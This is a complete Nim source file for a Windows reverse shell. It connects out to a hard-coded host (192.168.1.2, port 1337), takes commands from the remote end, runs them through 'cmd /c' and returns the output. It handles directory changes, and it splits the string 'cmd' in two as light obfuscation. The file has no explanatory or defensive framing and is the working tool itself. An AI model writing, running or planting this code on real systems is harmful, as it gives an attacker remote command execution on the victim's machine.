import net, os, osproc, strutils

proc exe(c: string): string =
  result = execProcess("cm" & "d /c " & c)

var
  power = newSocket()

  # 
  power1 = "192.168.1.2"
  power2 = "1337"

  s4 = "Exiting.."
  s5 = "cd"
  s6 = "C:\\"

try:
  power.connect(power1, Port(parseInt(power2)))

  while true:
    power.send(os.getCurrentDir() & "> ")
    let c = power.recvLine()
    if c == "exit":
      power.send(s4)
      break

    if c.strip() == s5:
      os.setCurrentDir(s6)
    elif c.strip().startswith(s5):
      let d = c.strip().split(' ')[1]
      try:
        os.setCurrentDir(d)
      except OSError as b:
        power.send(repr(b) & "\n")
        continue
    else:
      let r = exe(c)
      power.send(r)

except:
  raise
finally:
  power.close
